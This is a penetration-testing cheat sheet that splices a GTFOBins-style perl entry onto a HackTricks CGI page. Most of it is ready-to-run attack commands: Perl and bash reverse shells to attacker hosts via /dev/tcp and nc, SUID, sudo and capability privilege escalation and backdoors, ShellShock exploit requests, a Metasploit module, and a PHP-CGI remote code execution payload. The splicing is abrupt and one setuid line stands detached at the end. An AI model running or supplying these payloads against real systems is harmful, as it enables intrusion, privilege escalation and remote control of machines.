.. / perl

##
#
https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/cgi
#
##

Shell Reverse shell File read SUID Sudo Capabilities
Shell
It can be used to break out from restricted environments by spawning an interactive system shell.

perl -e 'exec "/bin/sh";'
Reverse shell
It can send back a reverse shell to a listening attacker to open a remote network access.

Run nc -l -p 12345 on the attacker box to receive the shell.

export RHOST=attacker.com
export RPORT=12345
perl -e 'use Socket;$i="$ENV{RHOST}";$p=$ENV{RPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
File read
It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.

LFILE=file_to_read
perl -ne print $LFILE
SUID
If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

sudo install -m =xs $(which perl) .

./perl -e 'exec "/bin/sh";'
Sudo
If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

sudo perl -e 'exec "/bin/sh";'
Capabilities
If the binary has the Linux CAP_SETUID capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID.

cp $(which perl) .
sudo setcap cap_setuid+ep perl




CGI
Information
The CGI scripts are perl scripts, so, if you have compromised a server that can execute .cgi scripts you can upload a perl reverse shell (/usr/share/webshells/perl/perl-reverse-shell.pl), change the extension from .pl to .cgi, give execute permissions (chmod +x) and access the reverse shell from the web browser to execute it.
In order to test for CGI vulns it's recommended to use nikto -C all (and all the plugins)

ShellShock
ShellShock is a vulnerability that affects the widely used Bash command-line shell in Unix-based operating systems. It targets the ability of Bash to run commands passed by applications. The vulnerability lies in the manipulation of environment variables, which are dynamic named values that impact how processes run on a computer. Attackers can exploit this by attaching malicious code to environment variables, which is executed upon receiving the variable. This allows attackers to potentially compromise the system.

Exploiting this vulnerability the page could throw an error.

You could find this vulnerability noticing that it is using an old Apache version and cgi_mod (with cgi folder) or using nikto.

Test
Most tests are based in echo something and expect that that string is returned in the web response. If you think a page may be vulnerable, search for all the cgi pages and test them.

Nmap

Copy
nmap 10.2.1.31 -p 80 --script=http-shellshock --script-args uri=/cgi-bin/admin.cgi
Curl (reflected, blind and out-of-band)
Copy
# Reflected
curl -H 'User-Agent: () { :; }; echo "VULNERABLE TO SHELLSHOCK"' http://10.1.2.32/cgi-bin/admin.cgi 2>/dev/null| grep 'VULNERABLE'
# Blind with sleep (you could also make a ping or web request to yourself and monitor that oth tcpdump)
curl -H 'User-Agent: () { :; }; /bin/bash -c "sleep 5"' http://10.11.2.12/cgi-bin/admin.cgi
# Out-Of-Band Use Cookie as alternative to User-Agent
curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/10.10.10.10/4242 0>&1' http://10.10.10.10/cgi-bin/user.sh
Shellsocker

Copy
python shellshocker.py http://10.11.1.71/cgi-bin/admin.cgi
Exploit
Copy
#Bind Shell
$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 8
#Reverse shell
$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 192.168.159.1 443 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 80
#Reverse shell using curl
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.11.0.41/80 0>&1' http://10.1.2.11/cgi-bin/admin.cgi
#Reverse shell using metasploit
> use multi/http/apache_mod_cgi_bash_env_exec
> set targeturi /cgi-bin/admin.cgi
> set rhosts 10.1.2.11
> run
Proxy (MitM to Web server requests)
CGI creates a environment variable for each header in the http request. For example: "host:web.com" is created as "HTTP_HOST"="web.com"

As the HTTP_PROXY variable could be used by the web server. Try to send a header containing: "Proxy: <IP_attacker>:<PORT>" and if the server performs any request during the session. You will be able to capture each request made by the server.

Old PHP + CGI = RCE (CVE-2012-1823, CVE-2012-2311)
Basically if cgi is active and php is "old" (<5.3.12 / < 5.4.2) you can execute code.
In order t exploit this vulnerability you need to access some PHP file of the web server without sending parameters (specially without sending the character "=").
Then, in order to test this vulnerability, you could access for example /index.php?-s (note the -s) and source code of the application will appear in the response.

Then, in order to obtain RCE you can send this special query: /?-d allow_url_include=1 -d auto_prepend_file=php://input and the PHP code to be executed in the body of the request.
Example:

Copy
curl -i --data-binary "<?php system(\"cat /flag.txt \") ?>" "http://jh2i.com:50008/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input"
More info about the vuln and possible exploits: https://www.zero-day.cz/database/337/, cve-2012-1823, cve-2012-2311, CTF Writeup Example.


./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
